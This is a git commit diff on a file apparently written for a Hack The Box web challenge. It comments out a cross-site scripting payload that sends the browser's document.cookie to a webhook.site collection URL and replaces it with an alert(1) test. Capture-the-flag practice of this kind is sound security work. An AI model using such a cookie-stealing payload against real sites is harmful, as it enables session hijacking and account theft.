084dcb76a886aed7264498a708c02a30b6f3ccc3
coinrockstar88 <coinrockstar@protonmail.com>
2024-01-04 18:22:24 +0800

    3

--- htb-chal-web-cursed-security-party.js
+++ htb-chal-web-cursed-security-party.js
@@ -1,1 +1,2 @@
-document.href='https://webhook.site/ca5af350-7824-4507-9f8c-092eb50cd6bf/leak?c='+document.cookie;
+// document.href='https://webhook.site/ca5af350-7824-4507-9f8c-092eb50cd6bf/leak?c='+document.cookie;
+alert(1);
